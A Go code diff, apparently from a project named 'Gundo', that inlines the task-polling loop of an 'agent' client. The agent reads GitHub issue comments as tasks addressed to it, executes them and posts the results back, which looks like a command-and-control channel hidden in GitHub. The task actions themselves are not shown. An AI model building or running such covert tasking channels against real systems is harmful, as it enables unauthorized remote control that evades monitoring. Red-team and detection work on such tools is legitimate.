@@ -201,7 +201,7 @@ func (c *Client) HeartbeatLoop(issueNumber int) {
 }
 
 func (c *Client) PollTasks(issueNumber int) {
-
+	// Get the comments that already exist when the client starts.
 	comments, err := shared.ListComments(issueNumber)
 	if err != nil {
 		fmt.Printf("Error getting initial comments: %v\n", err)
@@ -218,73 +218,56 @@ func (c *Client) PollTasks(issueNumber int) {
 	fmt.Printf("[+] Agent %s listening for tasks...\n", c.ID)
 
 	for {
-		if err := c.PollTasksOnce(
-			issueNumber,
-			&checkpoint,
-			shared.ListCommentsSince,
-			shared.CreateComment,
-		); err != nil {
+		comments, err := checkpoint.Poll(issueNumber, shared.ListCommentsSince)
+		if err != nil {
 			fmt.Printf("Error polling comments: %v\n", err)
+		} else {
+			for _, comment := range comments {
+				// Convert the GitHub comment body into a Gundo message.
+				message, err := shared.ParseGundoMessage(comment.Body)
+				if err != nil {
+					fmt.Printf("Ignoring non-Gundo comment: %v\n", err)
+					continue
+				}
+
+				// The client only executes task messages.
+				if message.Type != "task" {
+					continue
+				}
+
+				// Ignore tasks intended for a different client.
+				if message.TargetClientID != c.ID {
+					continue
+				}
+
+				fmt.Printf(
+					"[+] Task received: %s (%s)\n",
+					message.TaskID,
+					message.Action,
+				)
+
+				// Execute our supported action.
+				result := c.handleTask(message)
+
+				// Send the result back through the same GitHub mailbox.
+				err = shared.CreateComment(issueNumber, result)
+				if err != nil {
+					fmt.Printf(
+						"Error posting result for task %s: %v\n",
+						message.TaskID,
+						err,
+					)
+					continue
+				}
+
+				fmt.Printf(
+					"[+] Result sent for task %s: %s\n",
+					message.TaskID,
+					result.Output,
+				)
+			}
 		}
+
 		time.Sleep(10 * time.Second)
 	}
-}
-
-// One iteration is separate from the timer so mocked tests can exercise the
-// actual task filtering and result posting without starting an endless loop.
-// replaced the huge loop inside of pollTasks
-func (c *Client) PollTasksOnce(issueNumber int, checkpoint *shared.CommentCheckpoint,
-	list func(int, time.Time) ([]shared.IssueComment, error), post func(int, shared.GundoMessage) error) error {
-	comments, err := checkpoint.Poll(issueNumber, list)
-	if err != nil {
-		return err
-	}
-	// The bookmark includes all inspected comment types; only matching tasks run.
-	for _, comment := range comments {
-
-		// Convert the GitHub comment body into a Gundo message.
-		message, err := shared.ParseGundoMessage(comment.Body)
-		if err != nil {
-			fmt.Printf("Ignoring non-Gundo comment: %v\n", err)
-			continue
-		}
-
-		// The client only executes task messages.
-		if message.Type != "task" {
-			continue
-		}
-
-		// Ignore tasks intended for a different client.
-		if message.TargetClientID != c.ID {
-			continue
-		}
-
-		fmt.Printf(
-			"[+] Task received: %s (%s)\n",
-			message.TaskID,
-			message.Action,
-		)
-
-		// execute our supported action
-		// supported action takes the struct, builds a new one, and returns it
-		result := c.handleTask(message)
-
-		// Send the result back through the same GitHub mailbox.
-		err = post(issueNumber, result)
-		if err != nil {
-			fmt.Printf(
-				"Error posting result for task %s: %v\n",
-				message.TaskID,
-				err,
-			)
-			continue
-		}
-
-		fmt.Printf(
-			"[+] Result sent for task %s: %s\n",
-			message.TaskID,
-			result.Output,
-		)
-	}
-	return nil
 }
